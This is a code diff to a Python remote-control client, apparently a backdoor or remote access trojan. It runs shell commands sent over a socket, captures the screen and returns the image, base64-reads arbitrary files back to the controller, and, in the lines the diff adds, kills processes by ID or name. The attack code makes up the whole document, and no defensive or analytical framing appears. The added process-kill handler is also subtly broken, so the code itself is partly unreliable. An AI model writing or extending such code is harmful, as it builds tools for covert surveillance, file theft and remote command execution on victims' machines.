@@ -1,4 +1,5 @@
-import platform                                 
+import platform              
+import subprocess                   
 from socket import *
 from PIL import ImageGrab 
 from base64 import b64encode
@@ -15,16 +16,16 @@ if __name__ == '__main__':
     while True:                                                     
         RawDate    = str(Client.recv(1024), 'utf-8')                
         Date       = RawDate.split(" ")                            
-        Result     = "404 No Command Found"                
+        Result     = "Output: Unknown Command!"                
         MOD        = False                                          
     
 
-        if Date[0] == "command":                                    
+        if Date[0] == "cmd":                                    
             try: 
                 output = check_output(Date[1], shell="True")         
                 Result = str(output, 'utf-8')                      
             except: 
-                output = "ERROR: Wrong command?"                   
+                output = "Output: Wrong Command!"                   
                 Result = str(output)                                
     
         elif Date[0] == "chdir":                                    
@@ -37,7 +38,7 @@ if __name__ == '__main__':
                 chdir(Date[2])                                      
                 Result = "Chdir"                                
     
-        elif Date[0] == "showScreen":                                       
+        elif Date[0] == "showScreen" or Date[0] == "showscreen":                                       
             Img  = ImageGrab.grab()                                         
             Img.save("TMP.png")                                             
             with open("TMP.png", "rb") as file: output = file.read()        
@@ -51,7 +52,18 @@ if __name__ == '__main__':
         elif Date[0] == "file":                                                                               
             with open(str(Date[2]), "rb") as File:FileDate = File.read()                                      
             Result = b64encode(FileDate)                                                                      
-            MOD = True                                                                                        
+            MOD = True                           
+        elif Date[0] == 'stop':
+            if Date[1].isdigit():
+                stop = subprocess.call(["taskkill", "/F", "/PID", Date[1]])
+            else:
+                stop = subprocess.call(["taskkill", "/IM", Date[1]])
+            try:  
+                output_sub = check_output(stop, shell="True")         
+                Result = str(output_sub, 'utf-8')
+                Client.send(bytes(Result))
+            except Exception:
+                pass                                                           
 
         elif Date[0] == "quit":quit()                                                                        
     
